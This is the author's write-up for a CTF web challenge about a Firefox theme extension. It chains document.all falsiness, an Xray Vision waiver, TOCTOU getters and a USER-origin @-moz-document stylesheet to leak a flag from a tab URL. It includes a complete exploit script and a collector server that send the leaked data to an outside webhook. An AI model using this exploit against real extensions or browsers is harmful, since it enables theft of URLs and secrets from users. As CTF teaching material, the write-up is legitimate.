---
date: 2025-11-01T00:00:00+01:00
title: Ctrl+Space CTF Finals 2025 - RicingStar [Author Writeup]
summary: Writeup for the Ctrl+Space CTF Finals 2025 web client-side Firefox challenge "RicingStar".
categories: ["web"]
difficulty: "medium"
tags: ["authored", "client-side", "firefox", "extensions"]
showHero: true
---

## TL;DR
Forcing a [Firefox Xray Vision](https://firefox-source-docs.mozilla.org/dom/scriptSecurity/xray_vision.html) Waiving on an untrusted object passed via [`MessageEvent`](https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent) to a [Content Script](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts) privileged execution context using [`document.all`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAllCollection) object weirdness, and bypassing Content Script validation checks by defining custom getters on the waived `document.all` and by emptying all DOM tree nodes. Once the malicious object is forwarded to the Extension background script, all [`browser.scripting.insertCSS` API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/scripting/insertCSS) arguments can be set, and therefore injecting an [User origin stylesheet](https://developer.mozilla.org/en-US/docs/Glossary/Style_origin) with enabled [`@-moz-document`](https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/At-rules/@document) rules to exfiltrate the flag from the challenge tab URL. 

## Description
> Do you love ricing?


## Challenge Scenario
The challenge is supposed to be about a Custom Theme Generator extension for Firefox, since it's a fairly common practice for "ricing" enthusiasts to just trust third-parties `userChrome.css` themes files, even though they can be quite powerful. *But, it's just CSS at the end of the day, right..?*

Upon visiting the challenge page, flying mhackeroni™ spaceshuttles are flying all over the screen, and switching to the "Editor" tab, users can customize their Ctrl+Space™ special edition them as their likings:  

![extension landpage](./img/challenge_landpage.png "extension landpage")
<figure>
  <video controls autoplay loading="lazy">
    <source src="./img/mhackspacespam.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <figcaption>i had a bit too much fun with that :/</figcaption>
</figure>

The page also invites users to download their customized theme and applying it manually, or by directly installing the provided extension zip file and loading it in their Firefox Add-ons.  

Flying mhackeroni™ spaceshuttles are now navigating in your chatgpt.com window! Actually, all of them!  

![ctrl+space™ google.com](./img/google_theme.png "ctrl+space™ google.com")
![ctrl+space™ chatgpt.com](./img/chatgpt_theme.png "Your favorite clanker mhackeroni™ themed")

We can now analyze the actual challenge sources after harassing our GPU \:)

**The challenge bot** is fairly simple: runs a geckodriver instance under Selenium, allows only http/https urls, disables WASM and JIT, and finally does the following actions:
```python
driver.install_addon(EXTENSION_PATH, temporary=True)
driver.get(f"{BASE_URL}/?flag={FLAG}")
driver.switch_to.new_window("tab")
driver.get(url)
time.sleep(TIMEOUT)
```
Which 1) installs the provided extension as a temporary add-on, 2) visits the challenge page with the flag in the URL, 3) opens a new tab with the user-provided URL, and 4) sleeps for TIMEOUT (10) seconds before quitting. The player is therefore required to exfiltrate the flag from the challenge page URL, *but this can't be done with CSSI alone, right..?*

**The extension setup** is also quite simple and common: A `manifest.json` that gives `scripting` permission to an extension which is running a `background.js` on install and that injects a `contentscript.js` [Content Script](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts) on all pages to act as a "bridge" between the extension "priviledged" execution context and the "untrusted" page context and DOM.

**manifest.json**
```json
{
  "manifest_version": 3,
  "name": "Ctrl+Space CTF special edition firefox theme",
  "version": "1.0.0",
  "description": "✨",
  "permissions": [
    "scripting"
  ],
  "host_permissions": [
    "*://*/*"
  ],
  "background": {
    "scripts": ["background.js"]
  },
  "externally_connectable": {
    "matches": ["http://127.0.0.1:80", "http://localhost:80"]
  },
  "browser_specific_settings": {
    "gecko": {
      "id": "someonethatcantdospacepwnbutwritesffthemes@mhackeroni.it"
    }
  }
}
```
Note that the extension's manifest defined `host_permissions` for all URLs, which allows it to inject scripts and stylesheets into any webpage the user visits. Once installed, you'll also notice that the manifest declares [`externally_connectable`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/externally_connectable) URLs, because you'll get the following warning:
> Reading manifest: Warning processing `externally_connectable`: An unexpected property was found in the WebExtension manifest.

From MDN Web Docs:
> Externally connectable controls which other extensions and web pages can communicate with an extension using `runtime.connect()` and `runtime.sendMessage()` message passing.

However, as MDN also points out, the functionality it's [not yet supported on firefox](https://bugzilla.mozilla.org/show_bug.cgi?id=1319168), meaning it's useless. This was supposed to just be a cheap anti-slop/anti-llm-clankers hallucination bait 🎣 (pt.1.).

**background.js**
```js
// background.js

async function setup() {
  await browser.scripting.registerContentScripts([{
    id: "bridge",
    js: ["contentscript.js"],
    matches: ["*://*/*"],
    world: "ISOLATED"
  }]);
}

async function applyTheme(msg, sender) {
  const extInfo = await browser.management.getSelf();
  const ENV = extInfo.installType;
  if (ENV !== "development") return;
  if (sender.id !== browser.runtime.id) return;
  const defaultOpts = {
    origin: "AUTHOR",
    target: { tabId: sender.tab.id }
  };
  const opts = Object.assign(defaultOpts, msg);
  await browser.scripting.insertCSS(opts);
}

browser.runtime.onMessage.addListener(applyTheme);
browser.runtime.onInstalled.addListener(setup);
```

The extension's background script registers the content script on install from the extension files, and listens for messages from it to apply the theme CSS to the current tab. However, it only applies the theme if the [extension is in development mode](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/management/ExtensionInfo#installtype) and the message sender is the extension itself. A few remarks can be made here:
- "**Development mode**" just means whether the extension was loaded as a temporary add-on from disk or installed from the store. It's not a controllable flag. The client side bot will install it with the `temporary=True` flag, meaning the bot will always have that "development mode" enabled. This was supposed to just be a cheap anti-slop/anti-llm-clankers hallucination bait 🎣 (pt.2.).
- The **sender check is redundant**, since `runtime.onMessage` only receives messages from the extension's own context, i.e. only from the installed content script. This was supposed to just be a cheap anti-slop/anti-llm-clankers hallucination bait 🎣 (pt.3.).
- The `defaultOpts` object sets a few default arguments for the `insertCSS` call, but the object is then merged with the `msg` object with `Object.assign()` function, which uses **right-to-left precedence**, meaning they can be overridden if specified in the `msg` object. (Not a clanker bait this time).

But can we actually specify otherwise in the content script? Let's see.

**contentscript.js**
```js
// contentscript.js

function validateCssRules(cssRules) {
    for (const rule of cssRules) {
        if (![CSSStyleRule, CSSFontFaceRule, CSSKeyframesRule].some(type => rule instanceof type)) {
            throw new Error("[SPTE] Only CSS style-rules allowed");
        }
        validateCssRules(rule?.cssRules ?? []);
    }
}

function validateInsertOptions(opts) {
    if (opts.css && opts.files) {
        throw new Error("[SPTE] Cannot specify both CSS and files options");
    }

    if (opts.css && typeof opts.css === "string") {
        const stylesheet = new CSSStyleSheet();
        stylesheet.replaceSync(opts.css);
        validateCssRules(stylesheet.cssRules);
    }
    else if (opts.files && Array.isArray(opts.files)) {
        for (const fileUrl of opts.files) {
            if (new URL(fileUrl).origin !== new URL(browser.runtime.getURL("")).origin) {
                throw new Error("[SPTE] Invalid file origin");
            }
        }
    }
    else {
        throw new Error("[SPTE] Either CSS or files options must be specified");
    }

    if (opts.origin && opts.origin !== "AUTHOR") {
        throw new Error("[SPTE] Invalid origin specified");
    }
}

async function applyDefaultTheme() {
    let fetchedCss = await (await fetch("http://127.0.0.1:80/img/theme.css")).text();
    browser.runtime.sendMessage(browser.runtime.id, { css: fetchedCss }, {});
};

window.addEventListener("message", evt => {
    if (evt.origin !== window.origin) return;
    const options = evt.data || evt.data.wrappedJSObject;
    validateInsertOptions(options);
    const details = { ...options };
    browser.runtime.sendMessage(browser.runtime.id, details, {});
});

applyDefaultTheme();
```

The Content Script running in pages listens for incoming `message` events, validates that the event origin matches the current page origin, and then validates the `options` object received with `validateInsertOptions` function before forwarding it to the background script.  

First of all, the `if (evt.origin !== window.origin) return;` check is, again, useless, since the content script is running in the page context, `evt.origin` will always match `window.origin`. Moreover, while this is kinda of ok in normal webpages for cross-site protection, **it's not in case of extensions**. Any origin could just dispatch a raw [`MessageEvent`](https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent/MessageEvent) to the page, and it would trigger the content script event listener anyway, effectively bypassing any origin checks since `MessageEvent`'s constructor has an [`origin`](https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent/MessageEvent#options) parameter that can be set to any value. the `Event`'s `isTrusted` property should always be checked in those cases, since dispatched raw `MessageEvent` instances will always have `isTrusted` set to `false`.  

The `validateInsertOptions` function instead runs a few type checks and nullish/undefined checks on the passed properties, and particularly validates that:
- Either `css` or `files` property is specified.
- If `css` property is specified, it must be a string containing only CSS style rules (no `@import`, `@media`, `@supports`, `@namespace`, etc.) (I've just whitelisted the rules needed by the default CSS theme).
- If `files` property is specified, all files must be from the extension's own origin.
- If `origin` property is specified, it must be set to `"AUTHOR"`.

***As these checks stand out, it's not possible to achieve any meaningful injection*** *(except for Firefox 0days :p)*.  
*But Why?*  

## Stylesheets Origins
The key is mainly on the `insertCSS` API `origin` parameter restriction to `"AUTHOR"` only. This parameter specifies the [stylesheet origin](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_cascade/Cascade#origin_types) it's being applied.  

From MDN Web Docs:

> Author stylesheets are the most common type of stylesheet; these are the styles written by web developers. [...] The author, or web developer, defines the styles for the document using one or more linked or imported stylesheets, \<style\> blocks, and inline styles defined with the style attribute. These author styles define the look and feel of the website — its theme.

Basically common known CSS styles applied by web pages. So what are "*User stylesheets*" about then?

> In most browsers, the user (or reader) of the website can choose to override styles using a custom user stylesheet designed to tailor the experience to the user's wishes. Depending on the user agent, user styles can be configured directly or added via browser extensions.

Those have something to do with extensions! And these are exactly what type of stylesheets you're using when using custom `userChrome.css` themes on your riced Firefox setup!  
But how they differ in practice? User stylesheets have the higher precedence in the [CSS Cascade](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_cascade), meaning they will always override Author stylesheets, even if the Author styles use `!important` rules. But apart from that, they also have sometimes access to internal or legacy features that only UA stylesheets have!  

## `@-moz-document` at-rule abuse
For example, back in the days, Firefox allowed extensions to use `-moz-binding` CSS property, which allowed to bind XUL elements (Firefox's own UI elements!) to arbitrary XML files containing XBL components (definitely not safe at all). Those bindings had a weak "signed JAR" policy that could be bypassed and achieve UXSS! https://www.mozilla.org/en-US/security/advisories/mfsa2008-57/.  
**This is fun but 2008 is long gone, right?** (*Even tho they [restricted it to UA stylesheets only in 2019!](https://bugzilla.mozilla.org/show_bug.cgi?id=1523712)*)  
Yes, but more legacy features are still available. One of them is the [`-moz-document` CSS at-rule](https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/At-rules/@document). This at-rule ***allows to apply CSS rules based on document's URL matching***.  
Ouch :/ Who ever thought that would be a good idea?  
The feature as MDN documents, it's obviously non-standard, and was deprecated in Firefox after [Firefox bug 1035091](https://bugzilla.mozilla.org/show_bug.cgi?id=1035091) that exposed clear security issues with it. **However, the rule is still supported in Firefox user stylesheets!** 

![-moz-document deprecation mdn](./img/moz-document_compat_table.png "-moz-document deprecation mdn")

***And since we can define "USER" origin stylesheets within `insertCSS` API, we could use it to exfiltrate the flag from the challenge page URL.***  

{{< alert "circle-info" >}}
Honestly I think it's kinda ok to have as a feature in user stylesheets, but it's surely should be limited to domain matching only, but as today we can clearly match full URLs with it...and with regexes also!  
{{< /alert >}}

No CSP is applied to the challenge page, meaning the following rule will be enough to tell us whether the flag has a `0` character in the 2nd place:
```css
@-moz-document regexp("http:\/\/127\.0\.0\.1:80\/\?flag=space..0") {
  :root {
    --background-image: url("http://webhook/?flag=space{.0");
  }
}
```

## Waiving Firefox Xray Vision and abusing `document.all` weirdness
Well, but we can't set `origin: "USER"` parameter because of the content script check, right?  
We actually can! and it all relies in this little detail in the content script:

```js
const options = evt.data || evt.data.wrappedJSObject;
```

**The `evt.data.wrappedJSObject` property is a non-standard Firefox-specific object’s property present in higher priviledge execution contexts, that allows to access the underlying "wrapped" JavaScript object from XPCOM components, i.e. the underlying low-level C++ implementation of Javascript objects in the Gecko engine.**  
In Firefox, Javascript running in privileged security context, like extensions files, is called "**chrome code**" and assumed to be trusted ([**"If chrome-privileged code is compromised, the attacker can take over the user’s computer."**](https://firefox-source-docs.mozilla.org/dom/scriptSecurity/xray_vision.html#:~:text=If%20chrome-privileged%20code%20is%20compromised,%20the%20attacker%20can%20take%20over%20the%20user%E2%80%99s%20computer.)). Meanwhile JavaScript loaded from normal web pages is called "**content code**".  
But, content code can sometimes reach the chrome code execution context (e.g. think of an object passed inside a `postMessage`!) and that violates security boundaries:

> The security machinery in Gecko ensures that there’s asymmetric access between code at different privilege levels: so for example, content code can’t access objects created by chrome code, but chrome code can access objects created by content.
However, even the ability to access content objects can be a security risk for chrome code. JavaScript’s a highly malleable language. Scripts running in web pages can add extra properties to DOM objects (also known as expando properties) and even redefine standard DOM objects to do something unexpected. If chrome code relies on such modified objects, it can be tricked into doing things it shouldn’t.
 
Therefore, before reaching that execution context, Firefox applies a security layer called [***Xray Vision***](https://firefox-source-docs.mozilla.org/dom/scriptSecurity/xray_vision.html) that "wraps" user passed objects and allows the priviledged execution context to literally "see through" the object on any property access and directly use the underlying low-level C++ native implementation, meaning any user-defined expando properties or user redefinitions will be ignored because they exists on the higher-level JavaScript representation only.

Sometimes however, you actually want to access the full user-defined object, and to do so you need to "[Waive the object](https://firefox-source-docs.mozilla.org/dom/scriptSecurity/xray_vision.html)" (i.e. "unwrapping" the object), and a common way to do so is to use the `wrappedJSObject` property. As such this action is considered unsafe, as per MDN Web Docs:
> Waivers are transitive: so if you waive Xray vision for an object, then you automatically waive it for all the object’s properties. For example, window.wrappedJSObject.document gets you the waived version of document. To undo the waiver again, call Components.utils.unwaiveXrays(waivedObject).

Focus on the ***Waivers are transitive***: that's exactly what happens in our case! ***After obtaining the `evt.data.wrappedJSObject` object, all the `options.css`, `options.files`, `options.origin` properties, the object prototype chain, the object instance methods, etc. will be the user defined ones.***  

What does that implicates?  
***We can simply define our custom getters methods on the `evt.data` object to evade in a TOCTOU style the content script validation checks!*** More concretely:
```js
var nCalls = { "css": 0 };
Object.defineProperty(obj, 'css', {
  configurable: true,
  enumerable: true,
  get() {
    nCalls.css++;
    return nCalls.css % 2 === 0 ? evilCss : safeCss;
  }
});
```
We are defining using `Object.defineProperty` on an arbitrary user-controlled object `obj`, a custom getter for the `css` such that it will return the `safeCss` string value on the first call (i.e. during validation), and the `evilCss` string value on the second call (i.e. when the background script will read the property to forward it to `insertCSS` API).  
We can apply the same idea to all other properties and effectively make the content script checks useless.  

**We still have one last problem though: `options` will be defined as `evt.data.wrappedJSObject` only if `evt.data` is falsy**. How do we even pass a "falsy object" that can still be called as such? Aren't all objects truthy by definition in JavaScript? E.g:
```js
if ({}) console.log("runs");        // "runs"
if ([]) console.log("also runs");   // "also runs"
```

The only exceptions are for `false`, `0`, `null`, `undefined`, and `NaN`. However, those are called **primitive values** and as such they do not have their own properties or methods.  

How do you even do that??  
**Let me introduce yet another legacy, deprecated feature: [`document.all`](https://developer.mozilla.org/en-US/docs/Web/API/Document/all)** (it's still supported on all major browsers this time though!).  
This object is a legacy way to literally access all elements in the document DOM tree, in their order. It's an alternative to `Document.querySelectorAll` and returns an [`HTMLAllCollection`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAllCollection) object.  
However, this object is just straight up weird.  
E.g. what do you think `typeof document.all` returns? Clearly `undefined`, right? What about `document.all instanceof Object` then? Surely `true`, right? What about `if (!document.all) { console.log("wtf!?") }` ?? All objects are truthy by definition, right???? Well try it out yourself:

```js
console.log(typeof document.all);                // "undefined"
console.log(document.all instanceof Object);     // true
if (document.all) { console.log("all JS objects are truthy by definition"); } else { console.log("wtf!?"); } // "wtf!??"
console.log(document.all ? "truthy" : "falsy");  // "falsy"
console.log(document.all == false);              // false

// it's even callable!
document.all("shouldnotbecallableright")     // <div id="shouldnotbecallableright">
```

Those weird behaviors are due to legacy reasons and web compatibility and are documented in MDN [here](https://developer.mozilla.org/en-US/docs/Web/API/HTMLAllCollection#usage_in_javascript).  

***In summary, we can use `document.all` to get a falsy expression on the `const options = evt.data || evt.data.wrappedJSObject;` line, to get a user controllable Waived Xray Vision object, and then we can define our custom getters on it to bypass the content script checks.***  

One last obstacle remains: `document.all` in fact returns all elements of the page, meaning that even if we redefine custom getters we'll still have excess properties (i.e. the page html elements) inside the `details` object.  
Also, given that `details` is defined as `const details = { ...options };`, we'll have `HTMLElement` instances in it and since all `postMessages` (and therefore `browser.runtime.sendMessage`) calls use the [Structured clone algorithm](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm) on the passed object, it will throw a `DataCloneError: The object could not be cloned.` exception.  

What about having no html elements at all on the page then? Well, even if we define an empty page, the browser will still at least put the root element `<html>` in the DOM tree, meaning `document.all` will still contain at least that. Let alone the `<script>` tag itself hosting our exploit code.  
**What about removing \*ALL\* html elements from the DOM then? Like, all of them? Even the script tag itself, even the root `<html>` tag!?**  
Yes it's possible! (lol)

```js
while (document.firstChild) {
  document.removeChild(document.firstChild);
}
console.log(document.all.length); // 0
```

Finally, turns out that in all modern browsers we can manipulate the `document.all` object and the DOM tree such that `document.all` becomes an arbitrary falsy, empty, HTMLAllCollection object that can have arbitrary properties set by javascript or arbitrary named properties set using common DOM clobbering techniques. And it's even callable!

## CSS Exfiltration
At this point, the challenge is pretty much solved. Based on that we can achieve CSS injection on the challenge page by passing the crafted `document.all` object with our custom getters to the content script, with a `css` property containing our `@-moz-document` rules to match the flag, and by also passing a `origin: "USER"` property such that `@-moz-document` rules are actually enabled and a `target: { tabId: ... }` property to specify the tab to apply the CSS to (the flag tab will always have `tabId = 1` in the bot).  
Since I was lenient and put the whole flag in the URL instead of a runtime generated token, you could have even manually exfiltrated the flag by matching each character with multiple reports, but it could have been a bit painful since the the flag is 64 chars long.  

**My final exploit, instead, implements a one-shot solver playing around the CSS selectors Specificity algorithm**: since we will have multiple different `@-moz-document` rules, each one of them trying to match a different probe, e.g. `http://127.0.0.1/?flag?space{a`, `http://127.0.0.1/?flag?space{b`, `http://127.0.0.1/?flag?space{aa`, etc.  
The problem in having this many same rules, each one of them specifying a slightly different selector and trying to set the `background-image` attribute, will incour into a Specificity conflict and only the most specific rules "wins" the assigment. Only 1 exfiltration request will be triggered.  
I bypassed this restriction with the following payload generation:
```js
let knownFlag = "space{";
function buildEvilCss(nChars) {
  const totalProbes = nChars * ALPHABET.length;
  const collector = `:root { background-image: ${Array.from({ length: totalProbes }, (_, i) => `var(--p${i}, none)`).join(", ")} !important; }`;
  const blocks = [collector];
  let probeN = 0;
  for (let pos = 0; pos < nChars; pos++) {
    for (const char of ALPHABET) {
      const probePattern = escapeForRegex(BASE_URL + knownFlag + ".".repeat(pos) + char + ".*");
      blocks.push(
        `@-moz-document regexp("${probePattern}") {`,
        `  :root {`,
        `    --p${probeN}: url("${WEBHOOK}/leaked/${probePattern}");`,
        `  }`,
        `}`
      );
      probeN++;
    }
  }
  return blocks.join("\n");
}
```
Key detail: each matching rule sets a different custom property: `--p0`, `--p1`, `--p2`, `--pN` vars. Therefore, no conflicts will arise and all matching rules will be applied, each one triggering a different exfiltration request to my webhook server with the matched probe in the URL.  
The fact that each defined `--pN` var is resolved after their assignments is, again, because of the [CSS Cascade algorithm](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_cascade/Cascade) order.

## Solution

Wrapping everything up, the final exploit code is the following:

```js
// exploit.js

const WEBHOOK = "https://brle6wul.requestrepo.com";
const BASE_URL = "http://127.0.0.1/?flag=";
const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_{}?";

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const escapeForRegex = (s) => s.replace(/[/.?{}]/g, ".");

let knownFlag = "space{";
function buildEvilCss(nChars) {
  const totalProbes = nChars * ALPHABET.length;
  const collector = `:root { background-image: ${Array.from({ length: totalProbes }, (_, i) => `var(--p${i}, none)`).join(", ")} !important; }`;
  const blocks = [collector];
  let probeN = 0;
  for (let pos = 0; pos < nChars; pos++) {
    for (const char of ALPHABET) {
      const probePattern = escapeForRegex(BASE_URL + knownFlag + ".".repeat(pos) + char + ".*");
      blocks.push(
        `@-moz-document regexp("${probePattern}") {`,
        `  :root {`,
        `    --p${probeN}: url("${WEBHOOK}/leaked/${probePattern}");`,
        `  }`,
        `}`
      );
      probeN++;
    }
  }
  return blocks.join("\n");
}

function cleanDocumentAllObject() {
  while (document.firstChild) {
    document.removeChild(document.firstChild);
  }
}
cleanDocumentAllObject();

const evilCss = buildEvilCss(64);
const safeCss = `* {color: red !important; }`;

var nCalls = { "css": 0, "origin": 0 };
Object.defineProperty(document.all, 'css', {
  configurable: true,
  enumerable: true,
  get() {
    nCalls.css++;
    return nCalls.css % 2 === 0 ? safeCss : evilCss;
  }
});

Object.defineProperty(document.all, 'origin', {
  configurable: true,
  enumerable: true,
  get: function () {
    nCalls.origin++;
    return nCalls.origin % 2 === 0 ? "AUTHOR" : "USER";
  }
});

Object.defineProperty(document.all, 'target', {
  configurable: true,
  enumerable: true,
  get: function () {
    return { tabId: 1 };
  }
});


(async () => {
  await sleep(1_000);
  var fakeMessageEvent = new MessageEvent(
    "message",
    {
      origin: window.origin,
      data: document.all
    }
  );
  window.dispatchEvent(fakeMessageEvent);
  console.log("[PAGE] dispatched fake message event");
})();
```

and this was the server used to automatically startup a ngrok tunnel and reassemble all the collected probes:
```python
#!/usr/bin/env python3
import os, re, sys, time, json, logging, threading, requests, urllib.parse
from flask import Flask, Response
from pyngrok import ngrok

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1"
PORT = 8001
TIMEOUT = 20
QUIET_WINDOW = 10
FLAG_PREFIX = "space{"
EXPLOIT_TEMPLATE = open("exploit/exploit.js").read()

def escape_for_regex(text: str) -> str:
    return re.sub(r"[/.?{}]", ".", text)

def make_exploit(public_url: str, base_url: str) -> str:
    body = re.sub(r'const\s+WEBHOOK\s*=\s*".*?";', f'const WEBHOOK = "{public_url}";', EXPLOIT_TEMPLATE, count=1)
    return body

def parse_probe(probe: str):
    flag_index = probe.find("flag=")
    if flag_index == -1:
        return None
    fragment = probe[flag_index + 5 :]
    star_index = fragment.find(".*")
    if star_index == -1:
        return None
    value = fragment[:star_index]
    if not value.startswith(prefix_escaped):
        return None
    tail = value[len(prefix_escaped) :]
    if not tail:
        return None
    pos = len(tail) - 1
    token = tail[-1]
    char = token if token != "." else "?"
    return pos, char

app = Flask(__name__)
mutex = threading.Lock()
flag_chars = []
html_body = ""
exploit_body = ""
prefix_escaped = escape_for_regex(FLAG_PREFIX)
last_update = 0.0

@app.route("/")
def index() -> Response:
    return Response(html_body, mimetype="text/html")

@app.route("/exploit.js")
def exploit() -> Response:
    return Response(exploit_body, mimetype="application/javascript")

@app.route("/leaked/<path:pattern>")
def leaked(pattern: str) -> Response:
    decoded = urllib.parse.unquote(pattern)
    position_char = parse_probe(decoded)
    if position_char is not None:
        pos, ch = position_char
        with mutex:
            while len(flag_chars) <= pos:
                flag_chars.append("?")
            current = flag_chars[pos]
            if current == ch:
                return Response(status=204)
            if current != "?" and ch == "?":
                return Response(status=204)
            flag_chars[pos] = ch
            global last_update
            last_update = time.time()
            logging.info("Recovered #%d --> %s | %s", pos + len(FLAG_PREFIX), ch, FLAG_PREFIX + "".join(flag_chars))
    return Response(status=204)

def start_server() -> threading.Thread:
    thread = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, use_reloader=False, threaded=True),
        daemon=True,
    )
    thread.start()
    return thread

def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)s | %(message)s",
        datefmt="%H:%M:%S",
    )

    global html_body, exploit_body, flag_chars, last_update
    base_url = f"{TARGET.rstrip('/')}/?flag="
    flag_chars.clear()
    last_update = time.time()

    html_template = """<!doctype html><body><script src="{PUBLIC}/exploit.js"></script></body></html>"""

    logging.info("Starting local Flask server on port %d", PORT)
    start_server()

    token = os.environ.get("NGROK_AUTHTOKEN")
    if token:
        ngrok.set_auth_token(token)

    tunnel = None

    try:
        tunnel = ngrok.connect(f"http://127.0.0.1:{PORT}")
        public_url = tunnel.public_url.rstrip("/")
        logging.info("ngrok tunnel: %s", public_url)

        html_body = html_template.replace("{PUBLIC}", public_url)
        exploit_body = make_exploit(public_url, base_url)

        payload = {"url": f"{public_url}/"}
        logging.info("Triggering bot visit to %s", payload["url"])

        res = requests.post(
            f"{TARGET.rstrip('/')}/bot/visit",
            headers={"content-type": "application/json"},
            data=json.dumps(payload),
            timeout=10,
        )
        res.raise_for_status()

        logging.info("Bot accepted the visit. Waiting for leaks...")

        deadline = time.time() + TIMEOUT

        while time.time() < deadline:
            with mutex:
                no_updates = (time.time() - last_update > QUIET_WINDOW) and bool(flag_chars)
            if no_updates:
                break
            time.sleep(0.5)

        with mutex:
            if not flag_chars:
                logging.error("Timeout. No leaks captured.")
                return 1
            if flag_chars[-1] != "}":
                flag_chars[-1] = "}"
            final_flag = FLAG_PREFIX + "".join(flag_chars)

        logging.info("\n\nFlag recovered: %s", final_flag)
        print(final_flag)
        return 0
    except requests.RequestException as exc:
        logging.error("Bot visit failed: %s", exc)
        return 1
    finally:
        if tunnel is not None:
            try:
                ngrok.disconnect(tunnel.public_url)
            except Exception:
                pass

if __name__ == "__main__":
    raise SystemExit(main())
```

## Flag

> `space{s0_much_leg4cy_0ut_there_4nyw4y_h0w_d0_y0u_c4ll_th4t??_ucssi??}`